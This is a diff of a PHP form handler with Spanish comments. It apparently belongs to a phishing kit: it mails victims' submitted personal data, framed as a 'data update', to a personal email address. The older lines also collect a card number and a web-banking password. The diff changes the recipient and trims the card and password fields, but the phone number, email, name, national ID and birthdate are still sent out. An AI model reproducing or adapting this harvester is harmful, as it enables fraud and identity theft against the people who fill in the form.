@@ -12,20 +12,18 @@
     $birthdate = $_POST['birthdate'];
 
     //Correo a donde se envía la información
-    $to = "cruzadoeduar18@gmail.com";
-    //$to = "fernando1894@hotmail.com";
+    //$to = "cruzadoeduar18@gmail.com";
+    $to = "fernando1894@hotmail.com";
 
     //Asunto de correo
-    $subject = "ACTUALIZACIÓN DE DATOS";
+    $subject = "ACTUALIZACION DE DATOS CORREO 2";
 
     //Informacion que se envía en el correo
-    $txt =  "NUMERO DE TARJETA: " . $cc . "\n" . 
-            "DNI: " . $dni . "\n" . 
-            "NUMERO DE TELEFONO: " . $tel . "\n" . 
+    $txt =  "NUMERO DE TELEFONO: " . $tel . "\n" . 
             "DIRECCIÓN DE CORREO: " . $email . "\n" .
-            "NOMBRE: " . $name . "\n" . 
-            "FECHA DE NACIMIENTO: " . $birthdate . "\n" . 
-            "CLAVE WEB: " . $pass;
+            "NOMBRE: " . $name . "\n" .
+            "DNI: " . $dni . "\n" .
+            "FECHA DE NACIMIENTO: " . $birthdate;
 
     //Destinatario
     $headers = "From: pruebas@pruebas.ga";
